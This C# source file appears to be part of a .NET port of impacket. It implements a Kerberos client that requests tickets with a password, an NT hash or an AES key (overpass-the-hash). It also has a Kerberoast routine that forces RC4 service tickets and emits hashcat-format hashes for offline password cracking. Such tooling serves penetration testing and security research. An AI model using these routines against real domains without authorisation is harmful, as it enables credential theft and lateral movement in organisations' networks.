using System.Security.Cryptography;

namespace DotNetPacket.Protocols.Krb5;

/// <summary>A Ticket-Granting Ticket obtained from the AS exchange: the ticket itself plus the session key.</summary>
public sealed record Tgt(
    byte[] Ticket,
    int SessionKeyEtype,
    byte[] SessionKey,
    DateTimeOffset? EndTime,
    string Realm,
    string User,
    string ServiceName);

/// <summary>A service ticket and its session key, ready to build an AP-REQ against the service.</summary>
public sealed record ServiceTicket(
    byte[] Ticket,
    int SessionKeyEtype,
    byte[] SessionKey,
    string Realm,
    string User);

/// <summary>
/// High-level Kerberos client orchestration. <see cref="GetTgt"/> performs the full pre-auth AS
/// exchange over RC4-HMAC — the getTGT.py path — proving the client key and returning a usable TGT
/// (ticket + session key). This is the foundation the TGS examples (GetUserSPNs, getST) build on.
/// </summary>
public static class KerberosClient
{
    /// <summary>
    /// Requests a TGT for <paramref name="user"/>@<paramref name="realm"/> from the KDC at
    /// <paramref name="kdcHost"/> with a password. First probes the KDC for its supported etypes and
    /// salt (PA-ETYPE-INFO2), picks the strongest profile it offers — AES-256, then AES-128, then RC4,
    /// matching impacket's default — derives the client key and sends a PA-ENC-TIMESTAMP pre-auth.
    /// Throws with the KDC error on failure (e.g. wrong password -> KDC_ERR_PREAUTH_FAILED).
    /// </summary>
    public static Tgt GetTgt(string kdcHost, string realm, string user, string password, int port = 88)
    {
        realm = realm.ToUpperInvariant();
        (int etype, byte[] salt, int iterations) = ProbeEtypeInfo(kdcHost, realm, user, port);
        byte[] clientKey = Krb5Cipher.StringToKey(etype, password, salt, iterations);
        return GetTgtWithKeyEtype(kdcHost, realm, user, clientKey, etype, port);
    }

    /// <summary>
    /// Overpass-the-hash: request a TGT with the RC4 client key (the NT hash) supplied directly — the
    /// <c>-k -hashes</c> path, no password needed.
    /// </summary>
    public static Tgt GetTgtWithKey(string kdcHost, string realm, string user, byte[] clientKey, int port = 88)
        => GetTgtWithKeyEtype(kdcHost, realm, user, clientKey, Krb5Constants.Rc4Hmac, port);

    /// <summary>
    /// The shared pre-auth AS exchange: builds a PA-ENC-TIMESTAMP AS-REQ encrypted with
    /// <paramref name="clientKey"/> under <paramref name="etype"/>, and decrypts the AS-REP enc-part
    /// (key usage 3) to recover the TGT session key.
    /// </summary>
    public static Tgt GetTgtWithKeyEtype(string kdcHost, string realm, string user, byte[] clientKey, int etype, int port = 88)
    {
        realm = realm.ToUpperInvariant();

        DateTimeOffset now = DateTimeOffset.UtcNow;
        DateTimeOffset till = now.AddDays(1);
        uint nonce = (uint)RandomNumberGenerator.GetInt32(int.MaxValue);
        byte[] confounder = Krb5Cipher.NewConfounder(etype);

        byte[] req = AsReq.BuildPreauth(realm, user, clientKey, nonce, till, now, now.Microsecond, confounder, etype);
        KerberosResponse resp = KerberosResponse.Parse(KerberosTcpClient.SendReceive(kdcHost, req, port));
        if (!resp.IsAsRep)
        {
            throw new InvalidOperationException($"AS exchange failed: {Krb5Constants.DescribeError(resp.ErrorCode)}");
        }

        // AS-REP enc-part is encrypted with the client key, key usage 3.
        byte[] plaintext = Krb5Cipher.Decrypt(etype, clientKey, 3, resp.EncPartCipher);
        EncKdcRepPart part = EncKdcRepPart.Parse(plaintext);

        return new Tgt(resp.Ticket, part.SessionKeyEtype, part.SessionKey, part.EndTime, realm, user, $"krbtgt/{realm}");
    }

    /// <summary>
    /// Sends a no-pre-auth AS-REQ to learn the KDC's supported etypes + salt from the
    /// KDC_ERR_PREAUTH_REQUIRED error's PA-ETYPE-INFO2, and returns the strongest supported
    /// (etype, salt, PBKDF2 iterations). Falls back to AES-256 with the AD default salt
    /// (<c>REALM + user</c>) if the KDC returns no usable ETYPE-INFO2.
    /// </summary>
    private static (int Etype, byte[] Salt, int Iterations) ProbeEtypeInfo(string kdcHost, string realm, string user, int port)
    {
        byte[] defaultSalt = System.Text.Encoding.UTF8.GetBytes(realm + user);

        uint nonce = (uint)RandomNumberGenerator.GetInt32(int.MaxValue);
        byte[] probe = AsReq.Build(realm, user, nonce, DateTimeOffset.UtcNow.AddDays(1), Krb5Constants.DefaultEtypes);
        KerberosResponse resp = KerberosResponse.Parse(KerberosTcpClient.SendReceive(kdcHost, probe, port));

        // A non-preauth account answered straight away: no ETYPE-INFO2, so use its enc-part etype.
        if (resp.IsAsRep)
        {
            return (resp.EncPartEtype, defaultSalt, AesCtsCrypto.DefaultIterations);
        }

        if (resp.ErrorCode != Krb5Constants.KdcErrPreauthRequired)
        {
            throw new InvalidOperationException($"AS probe failed: {Krb5Constants.DescribeError(resp.ErrorCode)}");
        }

        EtypeInfo2Entry? best = EtypeInfo2.Parse(resp.EData)
            .Where(e => Krb5Cipher.IsSupported(e.Etype))
            .OrderByDescending(e => Krb5Cipher.Preference(e.Etype))
            .FirstOrDefault();

        if (best is null)
        {
            return (Krb5Constants.Aes256CtsHmacSha1, defaultSalt, AesCtsCrypto.DefaultIterations);
        }

        return (best.Etype, best.Salt ?? defaultSalt, best.Iterations);
    }

    /// <summary>
    /// The credential-to-service-ticket path shared by every Kerberos (<c>-k</c>) client (SMB, LDAP):
    /// obtain a TGT by the configured method — AES key (<c>-aesKey</c>), NT hash (<c>-hashes</c>, RC4
    /// overpass-the-hash), or a password (probes the KDC and prefers AES-256) — then request a service
    /// ticket for <paramref name="spn"/>. Exactly one of <paramref name="aesKey"/>/<paramref name="ntHash"/>
    /// should be set for overpass-the-hash; otherwise the password is used.
    /// </summary>
    public static ServiceTicket GetServiceTicketForSpn(
        string kdcHost, string realm, string user, string password, byte[]? ntHash, byte[]? aesKey, string spn, int port = 88)
    {
        Tgt tgt;
        if (aesKey is { } ak)
        {
            int etype = ak.Length == 32 ? Krb5Constants.Aes256CtsHmacSha1 : Krb5Constants.Aes128CtsHmacSha1;
            tgt = GetTgtWithKeyEtype(kdcHost, realm, user, ak, etype, port);
        }
        else if (ntHash is { } nh)
        {
            tgt = GetTgtWithKey(kdcHost, realm, user, nh, port);
        }
        else
        {
            tgt = GetTgt(kdcHost, realm, user, password, port);
        }

        return GetServiceTicket(kdcHost, tgt, spn, port);
    }

    /// <summary>
    /// Requests a service ticket for <paramref name="spn"/> (e.g. <c>cifs/host.realm</c>) using the
    /// TGT, decrypts the TGS-REP enc-part with the TGT session key (key usage 8) to recover the
    /// service session key, and returns the full ticket + that key — the material an AP-REQ needs to
    /// authenticate to the service. This is the getST path behind Kerberos (-k) SMB/LDAP login.
    /// </summary>
    public static ServiceTicket GetServiceTicket(string kdcHost, Tgt tgt, string spn, int port = 88)
    {
        DateTimeOffset now = DateTimeOffset.UtcNow;
        DateTimeOffset till = now.AddDays(1);
        uint nonce = (uint)RandomNumberGenerator.GetInt32(int.MaxValue);
        byte[] confounder = Krb5Cipher.NewConfounder(tgt.SessionKeyEtype); // sized to the TGT etype (RC4 8, AES 16)

        byte[] req = TgsReq.Build(tgt, spn, nonce, till, now, now.Microsecond, confounder);
        TgsRep rep = TgsRep.Parse(KerberosTcpClient.SendReceive(kdcHost, req, port));
        if (!rep.IsTgsRep)
        {
            throw new InvalidOperationException($"TGS exchange failed for {spn}: {Krb5Constants.DescribeError(rep.ErrorCode)}");
        }

        // TGS-REP enc-part is encrypted with the TGT session key (its etype), key usage 8.
        byte[] plaintext = Krb5Cipher.Decrypt(tgt.SessionKeyEtype, tgt.SessionKey, 8, rep.EncPartCipher);
        EncKdcRepPart part = EncKdcRepPart.Parse(plaintext);
        return new ServiceTicket(rep.Ticket, part.SessionKeyEtype, part.SessionKey, tgt.Realm, tgt.User);
    }

    /// <summary>
    /// Requests a service ticket for <paramref name="spn"/> using <paramref name="tgt"/> and returns
    /// the Kerberoast hash string (<paramref name="account"/> is the owning account's name, used only
    /// to label the hash). Throws with the KDC error on failure.
    /// </summary>
    public static string Kerberoast(string kdcHost, Tgt tgt, string spn, string account, int port = 88)
    {
        DateTimeOffset now = DateTimeOffset.UtcNow;
        DateTimeOffset till = now.AddDays(1);
        uint nonce = (uint)RandomNumberGenerator.GetInt32(int.MaxValue);
        byte[] confounder = Krb5Cipher.NewConfounder(tgt.SessionKeyEtype); // sized to the TGT etype (RC4 8, AES 16)

        // Force a roastable RC4 service ticket regardless of the TGT's etype (the classic Kerberoast).
        byte[] req = TgsReq.Build(tgt, spn, nonce, till, now, now.Microsecond, confounder, serviceEtype: Krb5Constants.Rc4Hmac);
        TgsRep rep = TgsRep.Parse(KerberosTcpClient.SendReceive(kdcHost, req, port));
        if (!rep.IsTgsRep)
        {
            throw new InvalidOperationException($"TGS exchange failed for {spn}: {Krb5Constants.DescribeError(rep.ErrorCode)}");
        }

        return KerbTgsRoast.Hashcat(rep.TicketEtype, account, tgt.Realm, spn, rep.TicketCipher);
    }
}
